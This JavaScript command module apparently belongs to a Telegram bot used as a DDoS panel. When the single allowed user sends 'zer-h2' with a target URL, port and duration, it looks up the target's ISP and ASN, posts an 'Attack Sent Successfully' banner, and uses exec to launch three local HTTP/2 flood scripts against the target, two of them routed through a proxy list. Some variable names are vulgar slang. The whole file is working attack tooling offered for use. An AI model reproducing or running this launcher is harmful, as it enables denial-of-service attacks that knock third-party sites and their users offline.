const axios = require("axios");
const url = require("url");
const path = require("path");
const { exec } = require("child_process");

const allowedId = 7818441356;

module.exports = {
  command: ["zer-h2"],
  run: async ({ client, message }) => {
    const senderId = parseInt(message.sender?.userId || message.senderId?.userId || message.senderId);
    if (senderId !== allowedId) return;

    const rawText = message.message?.trim();
    const args = rawText.split(/\s+/);
    args.shift(); // hapus command "https"

    if (args.length < 3) {
      return client.sendMessage(message.chatId, {
        message: "❌ Masukkan target, port, dan durasi.\n\nContoh:\nzer-h2 https://example.com 443 60",
        replyTo: message.id,
      });
    }

    const [target, port, duration] = args;
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;

    const { data } = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const info = data;

    const caption = `<blockquote>
✅ <b>ZER-H2 Attack Sent Successfully</b>
──────────────────────
🌐 <b>Host:</b> ${hostname}
📌 <b>Port:</b> ${port}
⏱️ <b>Duration:</b> ${duration}s
📡 <b>Method:</b> zer-h2
──────────────────────
🏢 <b>ISP:</b> ${info.isp}
🏷️ <b>ASN:</b> ${info.as}
🌍 <b>IP:</b> ${info.query}
</blockquote>`;

    await client.sendMessage(message.chatId, {
      message: caption,
      parseMode: "html",
      replyTo: message.id,
    });
    const kontol = path.join(__dirname, `../lib/cache/h2-nust`);
    const memek = path.join(__dirname, `../lib/cache/h2`);
    const scriptPath = path.join(__dirname, "../lib/cache/1");
    exec(`node ${scriptPath} ${target} ${duration}`);
    exec(`node ${kontol} ${target} ${duration} 16 7 proxy.txt`);
    exec(`node ${memek} ${target} ${duration} 17 9 proxy.txt`);
  },
};